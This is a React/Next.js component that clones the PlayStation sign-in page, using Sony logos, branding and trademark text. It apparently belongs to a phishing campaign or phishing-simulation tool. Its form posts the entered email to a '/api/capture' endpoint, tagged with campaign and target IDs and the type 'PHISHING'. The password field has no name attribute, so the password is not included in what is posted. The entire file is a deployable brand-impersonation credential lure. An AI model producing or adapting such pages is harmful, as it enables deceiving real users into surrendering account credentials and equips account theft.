'use client';

import React, { useState } from 'react';

export default function SonyLogin({ campaignId, targetId }: { campaignId: string, targetId: string }) {
  const [email, setEmail] = useState('');

  return (
    <div style={{ fontFamily: '"SST W01 Roman", "Helvetica Neue", Helvetica, Arial, sans-serif', backgroundColor: '#000', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
      
      {/* Sony Header */}
      <div style={{ width: '100%', backgroundColor: '#000', height: '40px', display: 'flex', justifyContent: 'flex-end', alignItems: 'center', padding: '0 20px', boxSizing: 'border-box' }}>
        <img src="https://www.sony.com/image/sony-logo-1.png" alt="SONY" style={{ height: '14px', filter: 'invert(1)' }} />
      </div>

      <main style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', width: '100%', padding: '0 20px', boxSizing: 'border-box' }}>
        {/* White PS Form Card */}
        <div style={{ backgroundColor: '#fff', width: '100%', maxWidth: '400px', marginTop: '40px', padding: '40px', boxSizing: 'border-box' }}>
          
          {/* PS Logo */}
          <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '24px' }}>
             <img src="https://gmedia.playstation.com/is/image/SIEPDC/playstation-logomark-white-on-black-01-nov20?$native$" alt="PlayStation" style={{ width: '56px', filter: 'invert(1)' }} />
          </div>

          <h1 style={{ textAlign: 'center', fontSize: '24px', fontWeight: 'bold', color: '#1f1f1f', margin: '0 0 24px 0' }}>
            Sign In to PlayStation
          </h1>

          <form method="POST" action="/api/capture" style={{ display: 'flex', flexDirection: 'column' }}>
            <input type="hidden" name="campaignId" value={campaignId} />
            <input type="hidden" name="targetId" value={targetId} />
            <input type="hidden" name="type" value="PHISHING" />

            <div style={{ marginBottom: '24px' }}>
              <input 
                type="email" 
                name="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Sign-In ID (Email Address)"
                required
                style={{
                  width: '100%',
                  padding: '12px',
                  border: '1px solid #1f1f1f',
                  fontSize: '16px',
                  boxSizing: 'border-box',
                  outline: 'none',
                  color: '#1f1f1f',
                  backgroundColor: '#fff'
                }}
              />
            </div>
            
            <div style={{ marginBottom: '24px' }}>
              <input 
                type="password" 
                placeholder="Password"
                required
                style={{
                  width: '100%',
                  padding: '12px',
                  border: '1px solid #1f1f1f',
                  fontSize: '16px',
                  boxSizing: 'border-box',
                  outline: 'none',
                  color: '#1f1f1f',
                  backgroundColor: '#fff'
                }}
              />
            </div>

            <button 
              type="submit" 
              style={{
                width: '100%',
                backgroundColor: '#2e69ff',
                color: '#fff',
                border: 'none',
                padding: '14px',
                fontSize: '16px',
                fontWeight: 'bold',
                cursor: 'pointer',
                marginBottom: '24px'
              }}
            >
              Sign In
            </button>

            <div style={{ textAlign: 'center', fontSize: '16px' }}>
              <a href="#" style={{ color: '#2e69ff', textDecoration: 'none', display: 'block', marginBottom: '16px' }}>Trouble Signing In?</a>
              <a href="#" style={{ color: '#2e69ff', textDecoration: 'none', display: 'block' }}>Create New Account</a>
            </div>

          </form>
        </div>
      </main>

      {/* PS Footer */}
      <footer style={{ width: '100%', backgroundColor: '#000', padding: '24px', display: 'flex', flexDirection: 'column', alignItems: 'center', color: '#fff', fontSize: '14px' }}>
        <img src="https://gmedia.playstation.com/is/image/SIEPDC/sie-logo-white-on-black-01-nov20?$native$" style={{ height: '32px', marginBottom: '16px' }} />
        <div style={{ textAlign: 'center', opacity: 0.8, fontSize: '12px', lineHeight: '1.5' }}>
          © 2026 Sony Interactive Entertainment LLC <br />
          PlayStation Family Mark, PlayStation, PS4 logo, PS4, PS5 logo, PS5, PS VR2 and PSN are registered trademarks or trademarks of Sony Interactive Entertainment Inc.
        </div>
      </footer>
    </div>
  );
}
